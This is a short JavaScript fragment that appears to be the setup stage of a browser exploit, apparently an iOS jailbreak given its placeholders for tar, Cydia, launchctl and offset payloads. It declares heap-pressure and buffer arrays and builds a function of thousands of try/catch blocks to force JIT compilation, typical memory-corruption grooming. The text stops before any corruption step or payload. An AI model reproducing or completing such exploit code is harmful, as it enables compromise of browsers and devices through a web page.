filestream = "LOADING";
payload_tar = "LOADING";
payload_cydia = "LOADING";
payload_launchctl = "LOADING";
payload_offsets = "LOADING";
var binfile = 0;
var mem0 = 0;
var mem1 = 0;
var mem2 = 0;
var pressure = new Array(400);
var bufs = new Array(10000);
var fcp = 0;
var smsh = new Uint32Array(0x10);
var trycatch = "";
for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
var fc = new Function(trycatch);